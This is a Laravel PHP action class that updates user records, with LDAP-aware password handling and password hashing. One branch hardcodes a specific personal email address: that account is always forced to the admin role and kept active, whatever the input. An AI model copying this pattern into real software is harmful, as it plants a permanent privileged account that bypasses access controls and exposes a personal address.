<?php

declare(strict_types=1);

namespace App\Actions\Users;

use App\Contracts\Repositories\UserRepositoryInterface;
use App\Models\User;
use Illuminate\Support\Facades\Hash;

readonly class UpdateUserAction
{
    public function __construct(
        private UserRepositoryInterface $repository
    ) {}

    public function execute(User $user, array $validated, bool $isActiveInput): User
    {
        if ($user->isLdapUser()) {
            unset($validated['password']);
        } elseif (!empty($validated['password'])) {
            $validated['password'] = Hash::make((string) $validated['password']);
        } else {
            unset($validated['password']);
        }

        if ($user->email === 'britojq@gmail.com') {
            $validated['role'] = 'admin';
            $validated['is_active'] = true;
        } else {
            $validated['is_active'] = $isActiveInput;
        }

        return $this->repository->update($user->id, $validated);
    }
}
